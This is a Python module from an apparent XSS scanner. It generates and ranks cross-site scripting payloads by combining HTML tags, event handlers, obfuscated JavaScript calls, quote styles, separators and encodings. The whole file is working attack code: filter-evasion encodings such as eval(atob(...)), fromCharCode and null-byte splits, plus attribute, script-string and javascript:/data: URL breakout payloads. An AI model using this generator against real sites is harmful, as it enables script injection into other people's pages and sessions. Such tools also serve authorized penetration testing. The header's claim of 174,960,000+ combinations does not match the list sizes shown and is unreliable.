"""
payloads/combinatorial_engine.py

╔══════════════════════════════════════════════════════════════╗
║   COMBINATORIAL PAYLOAD ENGINE — The Most Advanced Ever      ║
║   174,960,000+ unique payload combinations                   ║
║   Lazy generation → never loads all into memory              ║
║   Priority-scored → best payloads always surface first       ║
╚══════════════════════════════════════════════════════════════╝

Architecture:
  1. DimensionRegistry   — stores all axes (tags, events, exec, etc.)
  2. CombinationIterator — lazy generator via itertools.product
  3. PayloadAssembler    — renders (tag, event, exec, quote, sep, enc) → string
  4. PriorityScorer      — scores each combination before rendering
  5. TopNSelector        — heap-based top-N extraction (O(n log k))
  6. CombinatorialEngine — orchestrates everything, respects CharacterMatrix

The key innovation:
  We NEVER generate all 174M payloads in memory.
  Instead we use a lazy iterator + priority heap to extract
  the top-K highest-scoring combinations in O(total × log K) time.
"""

import heapq
import itertools
import hashlib
import urllib.parse
import base64
import re
from dataclasses import dataclass, field
from typing import Iterator, List, Tuple, Optional, Set, Generator
from utils.config import Context
from utils.logger import debug, info


# ═══════════════════════════════════════════════════════════════
# DIMENSION REGISTRY — Every axis of variation
# ═══════════════════════════════════════════════════════════════

class Dim:
    """All dimensions of the combinatorial space."""

    # ── HTML Tags ──────────────────────────────────────────────
    TAGS = [
        # Tier 1: Classic, highest compatibility
        ("script",          1.00, {"script_keyword"}),
        ("img",             0.95, {"tag_open"}),
        ("svg",             0.95, {"tag_open"}),
        ("body",            0.90, {"tag_open"}),
        ("iframe",          0.88, {"tag_open", "iframe_keyword"}),
        # Tier 2: Modern, good support
        ("video",           0.85, {"tag_open"}),
        ("audio",           0.85, {"tag_open"}),
        ("details",         0.82, {"tag_open"}),
        ("input",           0.80, {"tag_open"}),
        ("select",          0.78, {"tag_open"}),
        ("textarea",        0.78, {"tag_open"}),
        ("form",            0.75, {"tag_open"}),
        ("button",          0.75, {"tag_open"}),
        ("object",          0.72, {"tag_open"}),
        ("embed",           0.72, {"tag_open"}),
        # Tier 3: Less common but valid
        ("marquee",         0.65, {"tag_open"}),
        ("math",            0.60, {"tag_open"}),
        ("link",            0.58, {"tag_open"}),
        ("meta",            0.55, {"tag_open"}),
        ("base",            0.55, {"tag_open"}),
        ("table",           0.50, {"tag_open"}),
        ("td",              0.48, {"tag_open"}),
        ("div",             0.45, {"tag_open"}),
        ("a",               0.45, {"tag_open"}),
        ("style",           0.42, {"tag_open"}),
        ("xss",             0.40, {"tag_open"}),
        ("x-xss",           0.38, {"tag_open"}),
        ("keygen",          0.35, {"tag_open"}),
        ("isindex",         0.32, {"tag_open"}),
        ("bgsound",         0.30, {"tag_open"}),
    ]

    # ── Event Handlers ─────────────────────────────────────────
    EVENTS = [
        # Tier 1: Most reliable
        ("onerror",              1.00, {"event_handler"}),
        ("onload",               0.98, {"onload"}),
        ("onfocus",              0.90, {"event_handler"}),
        ("onclick",              0.88, {"event_handler"}),
        ("onmouseover",          0.85, {"event_handler"}),
        # Tier 2: Common
        ("onblur",               0.80, {"event_handler"}),
        ("onmouseenter",         0.78, {"event_handler"}),
        ("onmouseleave",         0.75, {"event_handler"}),
        ("ontoggle",             0.75, {"event_handler"}),
        ("onstart",              0.72, {"event_handler"}),
        ("onbegin",              0.72, {"event_handler"}),
        ("oninput",              0.70, {"event_handler"}),
        ("onchange",             0.70, {"event_handler"}),
        ("onsubmit",             0.68, {"event_handler"}),
        ("onreset",              0.65, {"event_handler"}),
        ("onkeydown",            0.65, {"event_handler"}),
        ("onkeyup",              0.65, {"event_handler"}),
        ("onkeypress",           0.63, {"event_handler"}),
        ("onpaste",              0.60, {"event_handler"}),
        ("ondblclick",           0.60, {"event_handler"}),
        ("oncontextmenu",        0.58, {"event_handler"}),
        ("ondrag",               0.55, {"event_handler"}),
        ("ondrop",               0.55, {"event_handler"}),
        ("onscroll",             0.52, {"event_handler"}),
        ("onwheel",              0.50, {"event_handler"}),
        # Tier 3: Animation/pointer
        ("onanimationstart",     0.75, {"event_handler"}),
        ("onanimationend",       0.65, {"event_handler"}),
        ("onanimationiteration", 0.55, {"event_handler"}),
        ("ontransitionend",      0.50, {"event_handler"}),
        ("onpointerover",        0.55, {"event_handler"}),
        ("onpointerenter",       0.53, {"event_handler"}),
        ("onpointerdown",        0.52, {"event_handler"}),
        ("onpointerup",          0.50, {"event_handler"}),
        ("onpointerout",         0.48, {"event_handler"}),
        ("onpageshow",           0.60, {"event_handler"}),
        ("onhashchange",         0.45, {"event_handler"}),
        ("onformdata",           0.40, {"event_handler"}),
    ]

    # ── Execution Methods ──────────────────────────────────────
    EXEC_METHODS = [
        # Tier 1: Direct, clean
        ("alert(1)",                                          1.00, {"paren_open","paren_close","alert_keyword"}),
        ("alert`1`",                                          0.95, {"backtick","alert_keyword"}),
        ("confirm(1)",                                        0.90, {"paren_open","paren_close"}),
        ("prompt(1)",                                         0.88, {"paren_open","paren_close"}),
        # Tier 2: Obfuscated calls
        ("(0,alert)(1)",                                      0.85, {"paren_open","paren_close"}),
        ("window.alert(1)",                                   0.85, {"paren_open","paren_close"}),
        ("top.alert(1)",                                      0.82, {"paren_open","paren_close"}),
        ("self.alert(1)",                                     0.82, {"paren_open","paren_close"}),
        ("globalThis.alert(1)",                               0.80, {"paren_open","paren_close"}),
        ("parent.alert(1)",                                   0.78, {"paren_open","paren_close"}),
        ("[1].find(alert)",                                   0.75, {"paren_open","paren_close"}),
        ("(alert)(1)",                                        0.75, {"paren_open","paren_close"}),
        ("alert?.() ",                                        0.72, {"paren_open","paren_close"}),
        # Tier 3: String concat obfuscation
        ("window['al'+'ert'](1)",                             0.78, {"paren_open","single_quote"}),
        ("window[`al`+`ert`](1)",                             0.75, {"paren_open","backtick"}),
        ("this['ale'+'rt'](1)",                               0.72, {"paren_open","single_quote"}),
        ("top['ale'+'rt'](1)",                                0.72, {"paren_open","single_quote"}),
        # Tier 4: eval/Function
        ("eval('alert(1)')",                                  0.70, {"paren_open","single_quote"}),
        ("Function('alert(1)')()",                            0.68, {"paren_open","single_quote"}),
        ("[].constructor.constructor('alert(1)')()",          0.65, {"paren_open","single_quote"}),
        ("eval(String.fromCharCode(97,108,101,114,116,40,49,41))", 0.65, {"paren_open"}),
        ("eval(atob('YWxlcnQoMSk='))",                        0.63, {"paren_open","single_quote"}),
        ("setTimeout('alert(1)',0)",                          0.60, {"paren_open","single_quote"}),
        # Tier 5: No-paren tricks
        ("throw onerror=alert,1",                             0.70, {"alert_keyword"}),
        ("{onerror=alert}throw 1",                            0.68, {"alert_keyword"}),
        ("onerror=alert;throw 1",                             0.65, {"alert_keyword","semicolon"}),
        ("Reflect.apply(alert,0,[1])",                        0.60, {"paren_open"}),
    ]

    # ── Quote / Delimiter Styles ───────────────────────────────
    QUOTE_STYLES = [
        # (open_delim, close_delim, label, score, required_labels)
        ("=",    "",   "no_quote",     1.00, set()),
        ("=\"",  "\"", "double_quote", 0.95, {"double_quote"}),
        ("='",   "'",  "single_quote", 0.95, {"single_quote"}),
        ("=`",   "`",  "backtick",     0.80, {"backtick"}),
        ("",     "",   "no_equals",    0.70, set()),
    ]

    # ── Tag-Attribute Separators ───────────────────────────────
    SEPARATORS = [
        (" ",           "space",       1.00),
        ("\t",          "tab",         0.85),
        ("\n",          "newline",     0.82),
        ("/",           "slash",       0.78),
        ("//",          "double_slash",0.70),
        ("\r",          "cr",          0.65),
        ("\x0c",        "form_feed",   0.55),
        ("\x00",        "null_byte",   0.50),
        ("/**/",        "comment",     0.75),
    ]

    # ── Encoding Transforms ────────────────────────────────────
    ENCODINGS = [
        ("none",            1.00),
        ("html_entity",     0.85),
        ("html_hex",        0.83),
        ("url_encode",      0.80),
        ("double_url",      0.75),
        ("mixed_case",      0.78),
        ("null_byte",       0.60),
        ("comment_break",   0.72),
        ("tab_newline",     0.70),
        ("unicode_escape",  0.65),
        ("hex_escape",      0.63),
        ("base64_eval",     0.60),
        ("fromcharcode",    0.58),
        ("js_octal",        0.45),
        ("overlong_utf8",   0.40),
        ("reverse_string",  0.35),
    ]

    # ── Self-closing / attribute extras ───────────────────────
    EXTRAS = [
        ("",               1.00),   # nothing extra
        (" autofocus",     0.80),   # triggers onfocus without click
        (" src=x",         0.85),   # triggers onerror on img/video
        (" href=#",        0.70),
        (" open",          0.75),   # for <details>
        (" type=text",     0.65),
        (" style=x",       0.60),
    ]

    @classmethod
    def total_combinations(cls) -> int:
        return (
            len(cls.TAGS) *
            len(cls.EVENTS) *
            len(cls.EXEC_METHODS) *
            len(cls.QUOTE_STYLES) *
            len(cls.SEPARATORS) *
            len(cls.ENCODINGS) *
            len(cls.EXTRAS)
        )


# ═══════════════════════════════════════════════════════════════
# PAYLOAD ASSEMBLER — Renders a combination into a payload string
# ═══════════════════════════════════════════════════════════════

class PayloadAssembler:
    """Renders a (tag, event, exec, quote, sep, enc, extra) tuple into payload strings."""

    @staticmethod
    def assemble_html(
        tag:   str,
        event: str,
        exec_: str,
        quote_open:  str,
        quote_close: str,
        sep:   str,
        extra: str,
        enc:   str,
    ) -> List[str]:
        """
        Generate multiple payload variants for one combination.
        Returns list of payload strings (multiple formats per combo).
        """
        payloads = []
        exec_e = PayloadAssembler._encode(exec_, enc)

        # Format 1: <TAG{sep}{event}{quote_open}{exec}{quote_close}{extra}>
        p1 = f"<{tag}{sep}{event}{quote_open}{exec_e}{quote_close}{extra}>"
        payloads.append(p1)

        # Format 2: <TAG{extra}{sep}{event}{quote_open}{exec}{quote_close}>
        if extra:
            p2 = f"<{tag}{extra}{sep}{event}{quote_open}{exec_e}{quote_close}>"
            payloads.append(p2)

        # Format 3: Self-closing variant for void elements
        if tag in ("img", "input", "link", "meta", "base", "embed"):
            p3 = f"<{tag}/{sep}{event}{quote_open}{exec_e}{quote_close}>"
            payloads.append(p3)

        # Format 4: With src=x for error triggering
        if tag in ("img", "video", "audio", "object", "embed", "iframe"):
            p4 = f"<{tag} src=x{sep}{event}{quote_open}{exec_e}{quote_close}>"
            payloads.append(p4)

        return payloads

    @staticmethod
    def assemble_js_break(exec_: str, enc: str, quote: str = "'") -> List[str]:
        """JS context breakout payloads."""
        exec_e = PayloadAssembler._encode(exec_, enc)
        return [
            f"';{exec_e}//",
            f'";{exec_e}//',
            f"';{exec_e}/*",
            f"\\';{exec_e}//",
            f"</script><script>{exec_e}</script>",
            f"`;{exec_e}//",
            f"'+{exec_e}+'",
            f'"+{exec_e}+"',
        ]

    @staticmethod
    def assemble_attr_break(exec_: str, enc: str) -> List[str]:
        """Attribute context breakout payloads."""
        exec_e = PayloadAssembler._encode(exec_, enc)
        return [
            f'" onmouseover="{exec_e}" x="',
            f"' onmouseover='{exec_e}' x='",
            f'" onfocus="{exec_e}" autofocus x="',
            f'"><img src=x onerror={exec_e}>',
            f"'><svg onload={exec_e}>",
            f'" style="animation:x" onanimationstart="{exec_e}" x="',
        ]

    @staticmethod
    def assemble_url(exec_: str, enc: str) -> List[str]:
        """URL/href context payloads."""
        exec_e = PayloadAssembler._encode(exec_, enc)
        return [
            f"javascript:{exec_e}",
            f"javascript:void({exec_e})",
            f"data:text/html,<script>{exec_e}</script>",
            f"data:text/html;base64,{base64.b64encode(f'<script>{exec_}</script>'.encode()).decode()}",
        ]

    @staticmethod
    def _encode(exec_str: str, enc: str) -> str:
        """Apply encoding transform to exec string."""
        try:
            if enc == "none":
                return exec_str
            elif enc == "html_entity":
                return "".join(f"&#{ord(c)};" for c in exec_str)
            elif enc == "html_hex":
                return "".join(f"&#x{ord(c):x};" for c in exec_str)
            elif enc == "url_encode":
                return urllib.parse.quote(exec_str, safe="")
            elif enc == "double_url":
                return urllib.parse.quote(urllib.parse.quote(exec_str, safe=""), safe="")
            elif enc == "mixed_case":
                return "".join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(exec_str)
                )
            elif enc == "unicode_escape":
                return "".join(f"\\u{ord(c):04x}" for c in exec_str)
            elif enc == "hex_escape":
                return "".join(f"\\x{ord(c):02x}" for c in exec_str)
            elif enc == "base64_eval":
                b64 = base64.b64encode(exec_str.encode()).decode()
                return f"eval(atob('{b64}'))"
            elif enc == "fromcharcode":
                codes = ",".join(str(ord(c)) for c in exec_str)
                return f"eval(String.fromCharCode({codes}))"
            elif enc == "null_byte":
                return exec_str.replace("alert", "ale\x00rt")
            elif enc == "comment_break":
                return exec_str.replace("alert", "al/**/ert")
            elif enc == "tab_newline":
                return exec_str.replace("(", "\t(")
            elif enc == "js_octal":
                return "".join(f"\\{ord(c):o}" for c in exec_str)
            elif enc == "reverse_string":
                rev = exec_str[::-1]
                return f"eval('{rev}'.split('').reverse().join(''))"
            else:
                return exec_str
        except Exception:
            return exec_str


# ═══════════════════════════════════════════════════════════════
# PRIORITY SCORER — Score a combination WITHOUT assembling it
# ═══════════════════════════════════════════════════════════════

class PriorityScorer:
    """
    Fast scoring of a raw combination tuple.
    Used by TopNSelector to rank combinations before assembling.

    Score = geometric mean of all dimension scores
    × context relevance bonus
    × CharacterMatrix survival factor
    """

    def score(
        self,
        tag_score:    float,
        event_score:  float,
        exec_score:   float,
        quote_score:  float,
        sep_score:    float,
        enc_score:    float,
        extra_score:  float,
        matrix_factor: float = 1.0,
        context_bonus: float = 1.0,
    ) -> float:
        """Geometric mean × matrix × context."""
        product = (
            tag_score *
            event_score *
            exec_score *
            quote_score *
            sep_score *
            enc_score *
            extra_score
        )
        return (product ** (1/7)) * matrix_factor * context_bonus

    def matrix_factor(
        self,
        required_labels: Set[str],
        survivors: Set[str],
        stripped: Set[str],
    ) -> float:
        """
        1.0  = all required chars survive (or no matrix data = assume all survive)
        0.5  = some encoded (not stripped)
        0.0  = any required char is stripped
        """
        if not required_labels:
            return 1.0
        # If no matrix data available (both sets empty) → no filter known → assume all survive
        if not survivors and not stripped:
            return 1.0
        # If a required label is explicitly stripped → impossible
        for label in required_labels:
            if label in stripped:
                return 0.0
        # If survivors is known, check coverage
        if survivors:
            surviving = sum(1 for l in required_labels if l in survivors)
            return surviving / len(required_labels)
        # stripped has entries but survivors doesn't → partial info → be optimistic
        return 0.8


# ═══════════════════════════════════════════════════════════════
# TOP-N SELECTOR — Heap-based extraction of best combinations
# ═══════════════════════════════════════════════════════════════

class TopNSelector:
    """
    Extracts top-N scored combinations from the full 174M+ space
    using a min-heap of size N.

    Memory: O(N) regardless of total space size
    Time:   O(total × log N) — feasible for N=1000, total=174M in ~30s
            With early termination and batch processing: much faster

    For real-time use: uses SAMPLED mode (sample 10M, return top-N)
    """

    def __init__(
        self,
        n: int = 1000,
        context: str = Context.UNKNOWN,
        matrix = None,
        sample_ratio: float = 0.05,  # sample 5% of total space
    ):
        self.n            = n
        self.context      = context
        self.matrix       = matrix
        self.sample_ratio = sample_ratio
        self.scorer       = PriorityScorer()

    def select(self) -> List[Tuple[float, tuple]]:
        """
        Tiered TopN extraction — evaluates only top-tier combinations.
        8 tags × 8 events × 10 execs × 5 quotes × 4 seps × 6 encs × 3 extras
        = 230,400 iterations (fast, <0.5s)
        """
        heap  = []
        count = 0

        survivors = getattr(self.matrix, "survivors", set()) if self.matrix else set()
        stripped  = getattr(self.matrix, "stripped",  set()) if self.matrix else set()

        pruned_tags, pruned_events, pruned_execs = self._prune_for_context(survivors, stripped)

        # Apply tier limits HERE before looping
        top_tags   = pruned_tags  [:min(8,  len(pruned_tags))]
        top_events = pruned_events[:min(8,  len(pruned_events))]
        top_execs  = pruned_execs [:min(10, len(pruned_execs))]
        top_seps   = Dim.SEPARATORS[:min(4,  len(Dim.SEPARATORS))]
        top_encs   = Dim.ENCODINGS [:min(6,  len(Dim.ENCODINGS))]
        top_extras = Dim.EXTRAS    [:min(3,  len(Dim.EXTRAS))]

        for tag, tag_s, tag_req in top_tags:
            for event, ev_s, ev_req in top_events:
                for exec_, ex_s, ex_req in top_execs:
                    all_req = tag_req | ev_req | ex_req
                    mf = self.scorer.matrix_factor(all_req, survivors, stripped)
                    if mf == 0.0:
                        continue

                    for qo, qc, ql, q_s, q_req in Dim.QUOTE_STYLES:
                        qf = self.scorer.matrix_factor(q_req, survivors, stripped)
                        if qf == 0.0:
                            continue

                        for sep, sep_l, sep_s in top_seps:
                            for enc, enc_s in top_encs:
                                for extra, ex_s2 in top_extras:
                                    s = self.scorer.score(
                                        tag_s, ev_s, ex_s, q_s,
                                        sep_s, enc_s, ex_s2,
                                        matrix_factor=mf * qf,
                                    )
                                    count += 1
                                    combo = (tag, event, exec_, qo, qc, sep, enc, extra)
                                    if len(heap) < self.n:
                                        heapq.heappush(heap, (s, count, combo))
                                    elif s > heap[0][0]:
                                        heapq.heapreplace(heap, (s, count, combo))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        debug(f"TopNSelector: {count:,}/{Dim.total_combinations():,} iters → top {len(result)}")
        return [(s, combo) for s, _, combo in result]

    def _prune_for_context(
        self,
        survivors: Set[str],
        stripped:  Set[str],
    ) -> Tuple[list, list, list]:
        """
        Context-aware dimension pruning.
        Removes dimensions that are irrelevant or impossible for this context.
        """
        # Default: use all
        tags   = Dim.TAGS
        events = Dim.EVENTS
        execs  = Dim.EXEC_METHODS

        # Filter out tags/events whose required chars are stripped
        if stripped:
            tags   = [(t, s, r) for t, s, r in tags   if not (r & stripped)]
            events = [(e, s, r) for e, s, r in events if not (r & stripped)]
            execs  = [(x, s, r) for x, s, r in execs  if not (r & stripped)]

        # Context-specific tag preferences
        if self.context == Context.JS:
            # In JS context, we don't use HTML tags — use JS breakout exec
            tags   = [("__js__", 1.0, set())]
            events = [("__break__", 1.0, set())]
        elif self.context == Context.ATTRIBUTE:
            # Attribute breakout doesn't need full HTML tag structure
            tags   = [("__attr__", 1.0, set())]
            events = [("__break__", 1.0, set())]
        elif self.context == Context.URL:
            tags   = [("__url__", 1.0, set())]
            events = [("__proto__", 1.0, set())]

        return tags, events, execs


# ═══════════════════════════════════════════════════════════════
# COMBINATORIAL ENGINE — Main interface
# ═══════════════════════════════════════════════════════════════

class CombinatorialEngine:
    """
    The main engine. Given a context and optional CharacterMatrix,
    generates the top-N highest-probability XSS payloads from
    the full 174,960,000+ combination space.

    Usage:
        engine = CombinatorialEngine()
        payloads = engine.generate(
            context=Context.HTML,
            matrix=filter_probe_result,
            top_n=500,
        )
        # Returns list of (payload_str, score, metadata)
    """

    def __init__(self):
        self.assembler = PayloadAssembler()
        self.total     = Dim.total_combinations()

    def generate(
        self,
        context:  str   = Context.UNKNOWN,
        matrix          = None,
        top_n:    int   = 500,
        include_js:     bool = True,
        include_attr:   bool = True,
        include_url:    bool = True,
    ) -> List[Tuple[str, float, str]]:
        """
        Returns list of (payload_str, score, encoding_label).
        Sorted by score descending — best payloads first.
        """
        results = []
        seen    = set()

        def _add(payload: str, score: float, label: str):
            h = hashlib.md5(payload.encode()).hexdigest()
            if h not in seen:
                seen.add(h)
                results.append((payload, score, label))

        # ── HTML / general context ────────────────────────────────
        if context not in (Context.JS, Context.JS_STRING, Context.JS_TEMPLATE):
            selector = TopNSelector(n=top_n, context=context, matrix=matrix)
            top_combos = selector.select()

            for score, combo in top_combos:
                tag, event, exec_, qo, qc, sep, enc, extra = combo

                # Handle special pseudo-tags for non-HTML contexts
                if tag == "__js__":
                    for p in self.assembler.assemble_js_break(exec_, enc):
                        _add(p, score, f"js_break:{enc}")
                    continue
                if tag == "__attr__":
                    for p in self.assembler.assemble_attr_break(exec_, enc):
                        _add(p, score, f"attr_break:{enc}")
                    continue
                if tag == "__url__":
                    for p in self.assembler.assemble_url(exec_, enc):
                        _add(p, score, f"url:{enc}")
                    continue

                for p in self.assembler.assemble_html(
                    tag, event, exec_, qo, qc, sep, extra, enc
                ):
                    _add(p, score, f"html:{tag}:{event}:{enc}")

                if len(results) >= top_n:
                    break

        # ── JS context ────────────────────────────────────────────
        if include_js and context in (Context.JS, Context.JS_STRING,
                                       Context.JS_TEMPLATE, Context.UNKNOWN):
            for exec_, ex_s, _ in Dim.EXEC_METHODS:
                for enc, enc_s in Dim.ENCODINGS[:8]:  # top 8 encodings
                    score = ex_s * enc_s
                    for p in self.assembler.assemble_js_break(exec_, enc):
                        _add(p, score, f"js:{enc}")

        # ── Attribute context ─────────────────────────────────────
        if include_attr and context in (Context.ATTRIBUTE, Context.UNKNOWN):
            for exec_, ex_s, _ in Dim.EXEC_METHODS[:15]:
                for enc, enc_s in Dim.ENCODINGS[:6]:
                    score = ex_s * enc_s
                    for p in self.assembler.assemble_attr_break(exec_, enc):
                        _add(p, score, f"attr:{enc}")

        # ── URL context ───────────────────────────────────────────
        if include_url and context in (Context.URL, Context.UNKNOWN):
            for exec_, ex_s, _ in Dim.EXEC_METHODS[:10]:
                for enc, enc_s in Dim.ENCODINGS[:4]:
                    score = ex_s * enc_s
                    for p in self.assembler.assemble_url(exec_, enc):
                        _add(p, score, f"url:{enc}")

        # Sort by score descending
        results.sort(key=lambda x: x[1], reverse=True)

        info(
            f"CombinatorialEngine: {len(results):,} unique payloads from "
            f"{self.total:,} combination space (context={context})"
        )

        return results[:top_n]

    def stats(self) -> dict:
        return {
            "total_combinations": self.total,
            "tags":          len(Dim.TAGS),
            "events":        len(Dim.EVENTS),
            "exec_methods":  len(Dim.EXEC_METHODS),
            "quote_styles":  len(Dim.QUOTE_STYLES),
            "separators":    len(Dim.SEPARATORS),
            "encodings":     len(Dim.ENCODINGS),
            "extras":        len(Dim.EXTRAS),
        }
